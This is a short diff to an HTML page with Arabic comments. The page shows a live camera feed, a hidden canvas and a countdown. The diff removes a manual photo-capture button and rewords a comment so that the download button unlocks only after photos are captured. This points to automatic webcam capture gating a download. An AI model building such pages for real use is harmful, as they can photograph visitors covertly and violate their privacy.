@@ -33,7 +33,7 @@
         }
 
         .download-button.enabled {
-            opacity: 1; /* تفعيل الزر عند انتهاء العد */
+            opacity: 1; /* تفعيل الزر بعد التقاط الصور */
         }
 
         .countdown {
@@ -50,7 +50,6 @@
 <!-- عرض الكاميرا لالتقاط الصور -->
 <video id="camera" width="640" height="480" autoplay></video>
 <canvas id="canvas" style="display:none;"></canvas>
-<button id="captureButton" onclick="captureImage()" style="display:none;">التقاط صورة</button>
 
 <!-- عداد العد التنازلي -->
 <p id="countdown" class="countdown">الوقت المتبقي: <span id="time">10</span> ثانية</p>
